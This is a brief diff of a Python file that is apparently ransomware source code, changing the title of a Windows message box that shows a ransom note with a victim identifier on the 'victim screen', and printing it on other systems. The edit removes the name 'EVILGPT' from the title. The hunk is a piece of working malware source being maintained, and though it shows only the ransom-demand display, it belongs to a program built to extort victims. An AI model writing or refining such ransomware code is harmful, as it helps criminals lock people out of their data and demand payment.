@@ -176,7 +176,7 @@ def main():
     # Show ransom note on victim screen
     if sys.platform == 'win32':
         import ctypes
-        ctypes.windll.user32.MessageBoxW(0, RANSOM_NOTE.format(uid=uid), "EVILGPT RANSOMWARE", 0x10)
+        ctypes.windll.user32.MessageBoxW(0, RANSOM_NOTE.format(uid=uid), "RANSOMWARE", 0x10)
     else:
         print(RANSOM_NOTE.format(uid=uid))
 
